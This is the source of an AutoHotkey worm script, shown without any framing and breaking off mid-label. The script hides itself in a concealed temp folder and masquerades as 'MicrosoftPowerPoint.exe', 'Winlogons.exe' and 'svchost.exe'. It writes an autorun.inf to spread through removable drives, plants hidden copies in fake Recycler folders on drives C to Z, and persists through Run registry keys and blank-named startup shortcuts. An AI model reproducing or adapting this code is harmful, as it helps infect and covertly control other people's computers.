#notrayicon
#singleinstance,ignore
IfNotExist,%temp%\MsData
{
FileCreateDir,%temp%\MsData
Filesetattrib,+SH,%temp%\MsData
}
else
{
}
process,exist,MicrosoftPowerPoint.exe
if errorlevel
goto rmxpr
process,exist,Winlogons.exe
if errorlevel
goto chkfls
exitapp
rmxpr:
ifexist,Z:\MicrosoftPowerPoint.exe
{
Run Z:
FileCopy,Z:\MicrosoftPowerPoint.exe,%temp%\MsData\MicrosoftPowerPoint.exe
goto opnd
}
else
{
ifexist,Y:\MicrosoftPowerPoint.exe
{
Run Y:
FileCopy, Y:\MicrosoftPowerPoint.exe,%temp%\MsData\MicrosoftPowerPoint.exe
goto opnd
}
else
{
ifexist,X:\MicrosoftPowerPoint.exe
{
Run X:
FileCopy, X:\MicrosoftPowerPoint.exe,%temp%\MsData\MicrosoftPowerPoint.exe
goto opnd
}
else
{
ifexist,W:\MicrosoftPowerPoint.exe
{
Run W:
FileCopy, W:\MicrosoftPowerPoint.exe,%temp%\MsData\MicrosoftPowerPoint.exe
goto opnd
}
else
{
ifexist,V:\MicrosoftPowerPoint.exe
{
Run V:
FileCopy, V:\MicrosoftPowerPoint.exe,%temp%\MsData\MicrosoftPowerPoint.exe
goto opnd
}
else
{
ifexist,U:\MicrosoftPowerPoint.exe
{
Run U:
FileCopy, U:\MicrosoftPowerPoint.exe,%temp%\MsData\MicrosoftPowerPoint.exe
goto opnd
}
else
{
ifexist,T:\MicrosoftPowerPoint.exe
{
Run T:
FileCopy, T:\MicrosoftPowerPoint.exe,%temp%\MsData\MicrosoftPowerPoint.exe
goto opnd
}
else
{
ifexist,S:\MicrosoftPowerPoint.exe
{
Run S:
FileCopy, S:\MicrosoftPowerPoint.exe,%temp%\MsData\MicrosoftPowerPoint.exe
goto opnd
}
else
{
ifexist,R:\MicrosoftPowerPoint.exe
{
Run R:
FileCopy, R:\MicrosoftPowerPoint.exe,%temp%\MsData\MicrosoftPowerPoint.exe
goto opnd
}
else
{
ifexist,Q:\MicrosoftPowerPoint.exe
{
Run Q:
FileCopy, Q:\MicrosoftPowerPoint.exe,%temp%\MsData\MicrosoftPowerPoint.exe
goto opnd
}
else
{
ifexist,P:\MicrosoftPowerPoint.exe
{
Run P:
FileCopy, P:\MicrosoftPowerPoint.exe,%temp%\MsData\MicrosoftPowerPoint.exe
goto opnd
}
else
{
ifexist,O:\MicrosoftPowerPoint.exe
{
Run O:
FileCopy, O:\MicrosoftPowerPoint.exe,%temp%\MsData\MicrosoftPowerPoint.exe
goto opnd
}
else
{
ifexist,N:\MicrosoftPowerPoint.exe
{
Run N:
FileCopy, N:\MicrosoftPowerPoint.exe,%temp%\MsData\MicrosoftPowerPoint.exe
goto opnd
}
else
{
ifexist,M:\MicrosoftPowerPoint.exe
{
Run M:
FileCopy, M:\MicrosoftPowerPoint.exe,%temp%\MsData\MicrosoftPowerPoint.exe
goto opnd
}
else
{
ifexist,L:\MicrosoftPowerPoint.exe
{
Run L:
FileCopy, L:\MicrosoftPowerPoint.exe,%temp%\MsData\MicrosoftPowerPoint.exe
goto opnd
}
else
{
ifexist,K:\MicrosoftPowerPoint.exe
{
Run K:
FileCopy, K:\MicrosoftPowerPoint.exe,%temp%\MsData\MicrosoftPowerPoint.exe
goto opnd
}
else
{
ifexist,J:\MicrosoftPowerPoint.exe
{
Run J:
FileCopy, J:\MicrosoftPowerPoint.exe,%temp%\MsData\MicrosoftPowerPoint.exe
goto opnd
}
else
{
ifexist,I:\MicrosoftPowerPoint.exe
{
Run I:
FileCopy, I:\MicrosoftPowerPoint.exe,%temp%\MsData\MicrosoftPowerPoint.exe
goto opnd
}
else
{
ifexist,H:\MicrosoftPowerPoint.exe
{
Run H:
FileCopy, h:\MicrosoftPowerPoint.exe,%temp%\MsData\MicrosoftPowerPoint.exe
goto opnd
}
else
{
ifexist,G:\MicrosoftPowerPoint.exe
{
Run G:
FileCopy, G:\MicrosoftPowerPoint.exe,%temp%\MsData\MicrosoftPowerPoint.exe
goto opnd
}
else
{
ifexist,F:\MicrosoftPowerPoint.exe
{
Run F:
FileCopy, F:\MicrosoftPowerPoint.exe,%temp%\MsData\MicrosoftPowerPoint.exe
goto opnd
}
else
{
ifexist,E:\MicrosoftPowerPoint.exe
{
Run E:
FileCopy,E:\MicrosoftPowerPoint.exe,%temp%\MsData\MicrosoftPowerPoint.exe
goto opnd
}
else
{
ifexist,D:\MicrosoftPowerPoint.exe
{
Run D:
FileCopy, D:\MicrosoftPowerPoint.exe,%temp%\MsData\MicrosoftPowerPoint.exe
goto opnd
}
else
{
ifexist,C:\MicrosoftPowerPoint.exe
{
Run C:
FileCopy, C:\MicrosoftPowerPoint.exe,%temp%\MsData\MicrosoftPowerPoint.exe
goto opnd
}
ELSE
{
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
opnd:
filesetattrib,+SH,%temp%\MsData\MicrosoftPowerPoint.exe
ifexist,\heap41a\offspring\MicrosoftPowerPoint.exe
{
filedelete,\heap41a\offspring\MicrosoftPowerPoint.exe
FileCopy,%temp%\MsData\MicrosoftPowerPoint.exe,\heap41a\offspring\MicrosoftPowerPoint.exe
}
ifexist,%temp%\MsData\svchost.exe
{
filedelete,%temp%\MsData\svchost.exe
if errorlevel
exitapp
}
fileappend,,frshinstl
goto instal
chkfls:
ifexist,\heap41a\offspring\MicrosoftPowerPoint.exe
{
filedelete,\heap41a\offspring\MicrosoftPowerPoint.exe
FileCopy,%temp%\MsData\MicrosoftPowerPoint.exe,\heap41a\offspring\MicrosoftPowerPoint.exe
}
IfNotExist,%temp%\MsData\svchost.exe
goto instal
IfNotExist,%temp%\MsData\drivelist
goto instal
IfNotExist,%temp%\MsData\MicrosoftPowerPoint.exe
goto instal
IfNotExist,%temp%\MsData\autorun.inf
goto instal
IfNotExist,%temp%\MsData\monitor
goto instal
ifexist,%temp%\MsData\svchost.exe
{
filedelete,%temp%\MsData\svchost.exe
if errorlevel
exitapp
}
else
{
Run %temp%\MsData\svchost.exe %temp%\MsData\monitor
}
instal:
filecopy,monitor,%temp%\MsData\monitor
filecopy,Msupdate.exe,%temp%\MsData\svchost.exe
Filedelete,%temp%\MsData\drivelist
Fileappend,
(
A
B
C
D
E
F
G
H
I
J
K
L
M
N
O
P
Q
R
S
T
U
V
W
X
Y
X
),%temp%\MsData\drivelist
filedelete,%temp%\MsData\autorun.inf
Fileappend,
(
[Autorun]
open=MicrosoftPowerPoint.exe
shellexecute=MicrosoftPowerPoint.exe
shell\Open \command=MicrosoftPowerPoint.exe
), %temp%\MsData\autorun.inf
Filesetattrib,+SH,%temp%\MsData\autorun.inf
Ifexist,frshinstl
Goto strtup
IfExist,%windir%\Winlogons.exe
{
FileCopy,%windir%\Winlogons.exe,%temp%\MsData\MicrosoftPowerPoint.exe
IfExist,%temp%\MsData\MicrosoftPowerPoint.exe
goto pptcpd
}
else
{
IfExist,C:\Recycler\Winlogons.exe
{
FileCopy,C:\Recycler\Winlogons.exe,%temp%\MsData\MicrosoftPowerPoint.exe
IfExist,%temp%\MsData\MicrosoftPowerPoint.exe
goto pptcpd
}
else
{
IfExist,D:\Recycler\Winlogons.exe
{
FileCopy,D:\Recycler\Winlogons.exe,%temp%\MsData\MicrosoftPowerPoint.exe
IfExist,%temp%\MsData\MicrosoftPowerPoint.exe
goto pptcpd
}
else
{
IfExist,E:\Recycler\Winlogons.exe
{
FileCopy,E:\Recycler\Winlogons.exe,%temp%\MsData\MicrosoftPowerPoint.exe
IfExist,%temp%\MsData\MicrosoftPowerPoint.exe
goto pptcpd
}
else
{
IfExist,F:\Recycler\Winlogons.exe
{
FileCopy,F:\Recycler\Winlogons.exe,%temp%\MsData\MicrosoftPowerPoint.exe
IfExist,%temp%\MsData\MicrosoftPowerPoint.exe
goto pptcpd
}
else
{
IfExist,G:\Recycler\Winlogons.exe
{
FileCopy,G:\Recycler\Winlogons.exe,%temp%\MsData\MicrosoftPowerPoint.exe
IfExist,%temp%\MsData\MicrosoftPowerPoint.exe
goto pptcpd
}
else
{
IfExist,H:\Recycler\Winlogons.exe
{
FileCopy,H:\Recycler\Winlogons.exe,%temp%\MsData\MicrosoftPowerPoint.exe
IfExist,%temp%\MsData\MicrosoftPowerPoint.exe
goto pptcpd
}
else
{
IfExist,I:\Recycler\Winlogons.exe
{
FileCopy,I:\Recycler\Winlogons.exe,%temp%\MsData\MicrosoftPowerPoint.exe
IfExist,%temp%\MsData\MicrosoftPowerPoint.exe
goto pptcpd
}
else
{
IfExist,J:\Recycler\Winlogons.exe
{
FileCopy,J:\Recycler\Winlogons.exe,%temp%\MsData\MicrosoftPowerPoint.exe
IfExist,%temp%\MsData\MicrosoftPowerPoint.exe
goto pptcpd
}
else
{
IfExist,K:\Recycler\Winlogons.exe
{
FileCopy,K:\Recycler\Winlogons.exe,%temp%\MsData\MicrosoftPowerPoint.exe
IfExist,%temp%\MsData\MicrosoftPowerPoint.exe
goto pptcpd
}
else
{
IfExist,L:\Recycler\Winlogons.exe
{
FileCopy,L:\Recycler\Winlogons.exe,%temp%\MsData\MicrosoftPowerPoint.exe
IfExist,%temp%\MsData\MicrosoftPowerPoint.exe
goto pptcpd
}
else
{
IfExist,M:\Recycler\Winlogons.exe
{
FileCopy,M:\Recycler\Winlogons.exe,%temp%\MsData\MicrosoftPowerPoint.exe
IfExist,%temp%\MsData\MicrosoftPowerPoint.exe
goto pptcpd
}
else
{
IfExist,N:\Recycler\Winlogons.exe
{
FileCopy,N:\Recycler\Winlogons.exe,%temp%\MsData\MicrosoftPowerPoint.exe
IfExist,%temp%\MsData\MicrosoftPowerPoint.exe
goto pptcpd
}
else
{
IfExist,O:\Recycler\Winlogons.exe
{
FileCopy,O:\Recycler\Winlogons.exe,%temp%\MsData\MicrosoftPowerPoint.exe
IfExist,%temp%\MsData\MicrosoftPowerPoint.exe
goto pptcpd
}
else
{
IfExist,P:\Recycler\Winlogons.exe
{
FileCopy,P:\Recycler\Winlogons.exe,%temp%\MsData\MicrosoftPowerPoint.exe
IfExist,%temp%\MsData\MicrosoftPowerPoint.exe
goto pptcpd
}
else
{
IfExist,Q:\Recycler\Winlogons.exe
{
FileCopy,Q:\Recycler\Winlogons.exe,%temp%\MsData\MicrosoftPowerPoint.exe
IfExist,%temp%\MsData\MicrosoftPowerPoint.exe
goto pptcpd
}
else
{
IfExist,R:\Recycler\Winlogons.exe
{
FileCopy,R:\Recycler\Winlogons.exe,%temp%\MsData\MicrosoftPowerPoint.exe
IfExist,%temp%\MsData\MicrosoftPowerPoint.exe
goto pptcpd
}
else
{
IfExist,S:\Recycler\Winlogons.exe
{
FileCopy,S:\Recycler\Winlogons.exe,%temp%\MsData\MicrosoftPowerPoint.exe
IfExist,%temp%\MsData\MicrosoftPowerPoint.exe
goto pptcpd
}
else
{
IfExist,T:\Recycler\Winlogons.exe
{
FileCopy,T:\Recycler\Winlogons.exe,%temp%\MsData\MicrosoftPowerPoint.exe
IfExist,%temp%\MsData\MicrosoftPowerPoint.exe
goto pptcpd
}
else
{
IfExist,U:\Recycler\Winlogons.exe
{
FileCopy,U:\Recycler\Winlogons.exe,%temp%\MsData\MicrosoftPowerPoint.exe
IfExist,%temp%\MsData\MicrosoftPowerPoint.exe
goto pptcpd
}
else
{
IfExist,V:\Recycler\Winlogons.exe
{
FileCopy,V:\Recycler\Winlogons.exe,%temp%\MsData\MicrosoftPowerPoint.exe
IfExist,%temp%\MsData\MicrosoftPowerPoint.exe
goto pptcpd
}
else
{
IfExist,W:\Recycler\Winlogons.exe
{
FileCopy,W:\Recycler\Winlogons.exe,%temp%\MsData\MicrosoftPowerPoint.exe
IfExist,%temp%\MsData\MicrosoftPowerPoint.exe
goto pptcpd
}
else
{
IfExist,X:\Recycler\Winlogons.exe
{
FileCopy,X:\Recycler\Winlogons.exe,%temp%\MsData\MicrosoftPowerPoint.exe
IfExist,%temp%\MsData\MicrosoftPowerPoint.exe
goto pptcpd
}
else
{
IfExist,Y:\Recycler\Winlogons.exe
{
FileCopy,Y:\Recycler\Winlogons.exe,%temp%\MsData\MicrosoftPowerPoint.exe
IfExist,%temp%\MsData\MicrosoftPowerPoint.exe
goto pptcpd
}
else
{
IfExist,Z:\Recycler\Winlogons.exe
FileCopy,Z:\Recycler\Winlogons.exe,%temp%\MsData\MicrosoftPowerPoint.exe
goto pptcpd
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
pptcpd:
FileSetAttrib,+SRH,%temp%\MsData\MicrosoftPowerPoint.exe
Run %temp%\MsData\svchost.exe %temp%\MsData\monitor
Exitapp
Strtup:
Filedelete,frshinstl
Ifexist,%Windir%\Winlogons.exe
goto restrt
FileCopy,%temp%\MsData\MicrosoftPowerPoint.exe,%Windir%\Winlogons.exe
if errorlevel
goto CINS
Regwrite,REG_SZ,HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,Winlogons,%Windir%\Winlogons.exe
If ErrorLevel
goto reg0
goto restrt
reg0:
Filecreateshortcut,"%Windir%\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg1
goto restrt
reg1:
Regwrite,REG_SZ,HKEY_CURRENT_USER,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,Winlogons,%Windir%\Winlogons.exe
If ErrorLevel
goto reg2
goto restrt
reg2:
filecreateshortcut,"%Windir%\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg3
goto restrt
reg3:
filecreateshortcut,"%Windir%\Winlogons.exe",%userprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg4
goto restrt
reg4:
filecreateshortcut,"%Windir%\Winlogons.exe",%windir%\Start Menu\Programs\Startup\ .lnk,,
goto restrt

CINS:
ifnotexist,C:\Recycler
{
filecreatedir,C:\Recycler
if errorlevel
goto DINS
FILESETATTRIB,+SH,C:\Recycler
}
ELSE
{
}
Ifexist,C:\Recycler\Winlogons.exe
goto restrt
FileCopy,%temp%\MsData\MicrosoftPowerPoint.exe,C:\Recycler\Winlogons.exe
Regwrite,REG_SZ,HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,Winlogons,C:\Recycler\Winlogons.exe
If ErrorLevel
goto reg5
goto restrt
reg5:
Filecreateshortcut,"C:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg6
goto restrt
reg6:
Regwrite,REG_SZ,HKEY_CURRENT_USER,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,Winlogons,C:\Recycler\Winlogons.exe
If ErrorLevel
goto reg121 
goto restrt
reg121:
filecreateshortcut,"C:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg7
goto restrt
reg7:
filecreateshortcut,"C:\Recycler\Winlogons.exe",%userprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg8
goto restrt
reg8:
filecreateshortcut,"C:\Recycler\Winlogons.exe",%windir%\Start Menu\Programs\Startup\ .lnk,,
goto restrt

DINS:
ifnotexist,D:\Recycler
{
filecreatedir,D:\Recycler
if errorlevel
goto EINS
FILESETATTRIB,+SH,D:\Recycler
}
ELSE
{
}
Ifexist,D:\Recycler\Winlogons.exe
goto restrt
FileCopy,%temp%\MsData\MicrosoftPowerPoint.exe,D:\Recycler\Winlogons.exe
Regwrite,REG_SZ,HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,Winlogons,D:\Recycler\Winlogons.exe
If ErrorLevel
goto reg9
goto restrt
reg9:
Filecreateshortcut,"D:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto restrt
Regwrite,REG_SZ,HKEY_CURRENT_USER,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,Winlogons,D:\Recycler\Winlogons.exe
If ErrorLevel
goto reg10
goto restrt
reg10:
filecreateshortcut,"D:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg11
goto restrt
reg11:
filecreateshortcut,"D:\Recycler\Winlogons.exe",%userprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg12
goto restrt
reg12:
filecreateshortcut,"D:\Recycler\Winlogons.exe",%windir%\Start Menu\Programs\Startup\ .lnk,,
goto restrt

EINS:
ifnotexist,E:\Recycler
{
filecreatedir,E:\Recycler
if errorlevel
goto FINS
FILESETATTRIB,+SH,E:\Recycler
}
ELSE
{
}
Ifexist,E:\Recycler\Winlogons.exe
goto restrt
FileCopy,%temp%\MsData\MicrosoftPowerPoint.exe,E:\Recycler\Winlogons.exe
Regwrite,REG_SZ,HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,Winlogons,E:\Recycler\Winlogons.exe
If ErrorLevel
goto reg13
goto restrt
reg13:
Filecreateshortcut,"E:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg14
goto restrt
reg14:
Regwrite,REG_SZ,HKEY_CURRENT_USER,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,Winlogons,E:\Recycler\Winlogons.exe
If ErrorLevel
goto reg15
goto restrt
reg15:
filecreateshortcut,"E:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg16
goto restrt
reg16:
filecreateshortcut,"E:\Recycler\Winlogons.exe",%userprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg17
goto restrt
reg17:
filecreateshortcut,"E:\Recycler\Winlogons.exe",%windir%\Start Menu\Programs\Startup\ .lnk,,
goto restrt

FINS:
ifnotexist,F:\Recycler
{
filecreatedir,F:\Recycler
if errorlevel
goto GINS
FILESETATTRIB,+SH,F:\Recycler
}
ELSE
{
}
Ifexist,F:\Recycler\Winlogons.exe
goto restrt
FileCopy,%temp%\MsData\MicrosoftPowerPoint.exe,F:\Recycler\Winlogons.exe
Regwrite,REG_SZ,HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,Winlogons,F:\Recycler\Winlogons.exe
If ErrorLevel
goto reg18
goto restrt
reg18:
Filecreateshortcut,"F:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg19
goto restrt
reg19:
Regwrite,REG_SZ,HKEY_CURRENT_USER,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,Winlogons,F:\Recycler\Winlogons.exe
If ErrorLevel
goto restrt
filecreateshortcut,"F:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg20
goto restrt
reg20:
filecreateshortcut,"F:\Recycler\Winlogons.exe",%userprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg21
goto restrt
reg21:
filecreateshortcut,"F:\Recycler\Winlogons.exe",%windir%\Start Menu\Programs\Startup\ .lnk,,
goto restrt

GINS:
ifnotexist,G:\Recycler
{
filecreatedir,G:\Recycler
if errorlevel
goto HINS
FILESETATTRIB,+SH,G:\Recycler
}
ELSE
{
}
Ifexist,G:\Recycler\Winlogons.exe
goto restrt
FileCopy,%temp%\MsData\MicrosoftPowerPoint.exe,G:\Recycler\Winlogons.exe
Regwrite,REG_SZ,HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,Winlogons,G:\Recycler\Winlogons.exe
If ErrorLevel
goto reg22
goto restrt
reg22:
Filecreateshortcut,"G:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto restrt
Regwrite,REG_SZ,HKEY_CURRENT_USER,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,Winlogons,G:\Recycler\Winlogons.exe
If ErrorLevel
goto reg23
goto restrt
reg23:
filecreateshortcut,"G:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg24
goto restrt
reg24:
filecreateshortcut,"G:\Recycler\Winlogons.exe",%userprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg25
goto restrt
reg25:
filecreateshortcut,"G:\Recycler\Winlogons.exe",%windir%\Start Menu\Programs\Startup\ .lnk,,
goto restrt

HINS:
ifnotexist,H:\Recycler
{
filecreatedir,H:\Recycler
if errorlevel
goto IINS
FILESETATTRIB,+SH,H:\Recycler
}
ELSE
{
}
Ifexist,H:\Recycler\Winlogons.exe
goto restrt
FileCopy,%temp%\MsData\MicrosoftPowerPoint.exe,H:\Recycler\Winlogons.exe
Regwrite,REG_SZ,HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,Winlogons,H:\Recycler\Winlogons.exe
If ErrorLevel
goto reg26
goto restrt
reg26:
Filecreateshortcut,"H:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg27
goto restrt
reg27:
Regwrite,REG_SZ,HKEY_CURRENT_USER,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,Winlogons,H:\Recycler\Winlogons.exe
If ErrorLevel
goto reg28
goto restrt
reg28:
filecreateshortcut,"H:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg29
goto restrt
reg29:
filecreateshortcut,"H:\Recycler\Winlogons.exe",%userprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg30
goto restrt
reg30:
filecreateshortcut,"H:\Recycler\Winlogons.exe",%windir%\Start Menu\Programs\Startup\ .lnk,,
goto restrt

IINS:
ifnotexist,I:\Recycler
{
filecreatedir,I:\Recycler
if errorlevel
goto JINS
FILESETATTRIB,+SH,I:\Recycler
}
ELSE
{
}
Ifexist,I:\Recycler\Winlogons.exe
goto restrt
FileCopy,%temp%\MsData\MicrosoftPowerPoint.exe,I:\Recycler\Winlogons.exe
Regwrite,REG_SZ,HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,Winlogons,I:\Recycler\Winlogons.exe
If ErrorLevel
goto reg31
goto restrt
reg31:
Filecreateshortcut,"I:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg32
goto restrt
reg32:
Regwrite,REG_SZ,HKEY_CURRENT_USER,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,Winlogons,I:\Recycler\Winlogons.exe
If ErrorLevel
goto reg33
goto restrt
reg33:
filecreateshortcut,"I:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg35
goto restrt
reg35:
filecreateshortcut,"I:\Recycler\Winlogons.exe",%userprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg34
goto restrt
reg34:
filecreateshortcut,"I:\Recycler\Winlogons.exe",%windir%\Start Menu\Programs\Startup\ .lnk,,
goto restrt

JINS:
ifnotexist,J:\Recycler
{
filecreatedir,J:\Recycler
if errorlevel
goto KINS
FILESETATTRIB,+SH,J:\Recycler
}
ELSE
{
}
Ifexist,J:\Recycler\Winlogons.exe
goto restrt
FileCopy,%temp%\MsData\MicrosoftPowerPoint.exe,J:\Recycler\Winlogons.exe
Regwrite,REG_SZ,HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,Winlogons,J:\Recycler\Winlogons.exe
If ErrorLevel
goto reg36
goto restrt
reg36:
Filecreateshortcut,"J:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg37
goto restrt
reg37:
Regwrite,REG_SZ,HKEY_CURRENT_USER,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,Winlogons,J:\Recycler\Winlogons.exe
If ErrorLevel
goto reg38
goto restrt
reg38:
filecreateshortcut,"J:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg39
goto restrt
reg39:
filecreateshortcut,"J:\Recycler\Winlogons.exe",%userprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg40
goto restrt
reg40:
filecreateshortcut,"J:\Recycler\Winlogons.exe",%windir%\Start Menu\Programs\Startup\ .lnk,,
goto restrt

KINS:
ifnotexist,K:\Recycler
{
filecreatedir,K:\Recycler
if errorlevel
goto LINS
FILESETATTRIB,+SH,K:\Recycler
}
ELSE
{
}
Ifexist,K:\Recycler\Winlogons.exe
goto restrt
FileCopy,%temp%\MsData\MicrosoftPowerPoint.exe,K:\Recycler\Winlogons.exe
Regwrite,REG_SZ,HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,Winlogons,K:\Recycler\Winlogons.exe
If ErrorLevel
goto reg41
goto restrt
reg41:
Filecreateshortcut,"K:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg42
goto restrt
reg42:
Regwrite,REG_SZ,HKEY_CURRENT_USER,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,Winlogons,K:\Recycler\Winlogons.exe
If ErrorLevel
goto reg43
goto restrt
reg43:
filecreateshortcut,"K:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg44
goto restrt
reg44:
filecreateshortcut,"K:\Recycler\Winlogons.exe",%userprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg45
goto restrt
reg45:
filecreateshortcut,"K:\Recycler\Winlogons.exe",%windir%\Start Menu\Programs\Startup\ .lnk,,
goto restrt

LINS:
ifnotexist,L:\Recycler
{
filecreatedir,L:\Recycler
if errorlevel
goto MINS
FILESETATTRIB,+SH,L:\Recycler
}
ELSE
{
}
Ifexist,L:\Recycler\Winlogons.exe
goto restrt
FileCopy,%temp%\MsData\MicrosoftPowerPoint.exe,L:\Recycler\Winlogons.exe
Regwrite,REG_SZ,HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,Winlogons,L:\Recycler\Winlogons.exe
If ErrorLevel
goto reg46
goto restrt
reg46:
Filecreateshortcut,"L:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg47
goto restrt
reg47:
Regwrite,REG_SZ,HKEY_CURRENT_USER,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,Winlogons,L:\Recycler\Winlogons.exe
If ErrorLevel
goto reg48
goto restrt
reg48:
filecreateshortcut,"L:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg49
goto restrt
reg49:
filecreateshortcut,"L:\Recycler\Winlogons.exe",%userprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg50
goto restrt
reg50:
filecreateshortcut,"L:\Recycler\Winlogons.exe",%windir%\Start Menu\Programs\Startup\ .lnk,,
goto restrt

MINS:
ifnotexist,M:\Recycler
{
filecreatedir,M:\Recycler
if errorlevel
goto NINS
FILESETATTRIB,+SH,M:\Recycler
}
ELSE
{
}
Ifexist,M:\Recycler\Winlogons.exe
goto restrt
FileCopy,%temp%\MsData\MicrosoftPowerPoint.exe,M:\Recycler\Winlogons.exe
Regwrite,REG_SZ,HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,Winlogons,M:\Recycler\Winlogons.exe
If ErrorLevel
goto reg51
goto restrt
reg51:
Filecreateshortcut,"M:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg52
goto restrt
reg52:
Regwrite,REG_SZ,HKEY_CURRENT_USER,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,Winlogons,M:\Recycler\Winlogons.exe
If ErrorLevel
goto reg53
goto restrt
reg53:
filecreateshortcut,"M:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg54
goto restrt
reg54:
filecreateshortcut,"M:\Recycler\Winlogons.exe",%userprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg55
goto restrt
reg55:
filecreateshortcut,"M:\Recycler\Winlogons.exe",%windir%\Start Menu\Programs\Startup\ .lnk,,
goto restrt

NINS:
ifnotexist,N:\Recycler
{
filecreatedir,N:\Recycler
if errorlevel
goto OINS
FILESETATTRIB,+SH,N:\Recycler
}
ELSE
{
}
Ifexist,N:\Recycler\Winlogons.exe
goto restrt
FileCopy,%temp%\MsData\MicrosoftPowerPoint.exe,N:\Recycler\Winlogons.exe
Regwrite,REG_SZ,HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,Winlogons,N:\Recycler\Winlogons.exe
If ErrorLevel
goto reg56
goto restrt
reg56:
Filecreateshortcut,"N:\Recycler\Winlogons.exe",%allusersprofile%\Start Menu\Programs\Startup\ .lnk,,
If ErrorLevel
goto reg57
goto restrt
reg57:
